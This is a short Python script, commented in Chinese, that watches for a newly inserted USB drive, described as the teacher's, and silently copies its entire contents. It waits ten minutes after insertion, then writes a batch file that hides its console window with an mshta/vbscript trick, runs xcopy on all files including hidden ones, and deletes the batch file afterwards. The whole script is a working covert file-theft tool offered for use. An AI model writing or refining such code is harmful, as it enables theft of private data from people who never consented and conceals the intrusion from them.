#pip install psutil
import psutil,shutil,os
from time import sleep

#新建文件夹以存放文件
dir=os.getcwd()
try:
    os.mkdir('files')
except:
    pass
dir=dir+r'\files'

#获取磁盘信息
disk=psutil.disk_partitions()

#统计当前分区的数量
time=0
for i in disk:
    time=time+1

#写一个bat隐藏复制时的窗口
def cbat(copydir,dir):
    bat=open('copy.bat','w',encoding='utf-8')
    print('@echo off',file=bat)
    print('if "%1"=="hide" goto CmdBegin',file=bat)
    print('start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit',file=bat)
    print(':CmdBegin',file=bat)
    print(' ',file=bat)
    ml='xcopy '+copydir+' '+dir+' /E /H /R'
    print(ml,file=bat)
    bat.close()

#循环检测是否老师插入U盘
while True:
    disk=psutil.disk_partitions()
    times=0
    for i in disk:
        times=times+1
    print('当前分区数为：',times)
    if times>time: #当前分区数变大时，就是老师插入U盘的时候
        print('开始复制...')
        copydir=str(disk[times-1][0])
        print(copydir)
        sleep(600) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
        cbat(copydir,dir)
        os.system('copy.bat')
        os.remove('copy.bat')
        print('复制完成')
        time=time+1
    elif times<time: #当前分区数变小时，就是老师拔出U盘的时候
        time=0
        for i in disk:
            time=time+1
    else:
        print('waiting...')
        sleep(30) #每隔30秒获取磁盘信息
